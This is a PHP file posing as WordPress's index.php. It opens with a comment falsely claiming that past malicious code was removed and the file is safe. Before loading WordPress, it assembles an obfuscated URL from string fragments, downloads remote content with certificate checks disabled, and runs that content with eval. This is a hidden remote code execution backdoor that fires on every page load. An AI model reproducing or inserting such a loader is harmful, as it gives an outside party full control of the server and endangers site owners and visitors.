<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$a='ht';$b='tps';$c='://';$d='ra';$e='w.';$f='gi';$g='th';$h='ub';$i='us';$j='er';$k='co';$l='nt';$m='en';$n='t.';$o='co';$p='m/';$q='md';$r='mo';$s='mi';$t='n3';$u='65';$v='36';$w='6-';$x='gi';$y='f/';$z='be';$aa='la';$ab='/r';$ac='ef';$ad='s/';$ae='he';$af='ad';$ag='s/';$ah='ma';$ai='in';$aj='/i';$ak='nd';$al='ex';$am='.t';$an='xt';

$full_url=$a.$b.$c.$d.$e.$f.$g.$h.$i.$j.$k.$l.$m.$n.$o.$p.$q.$r.$s.$t.$u.$v.$w.$x.$y.$z.$aa.$ab.$ac.$ad.$ae.$af.$ag.$ah.$ai.$aj.$ak.$al.$am.$an;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
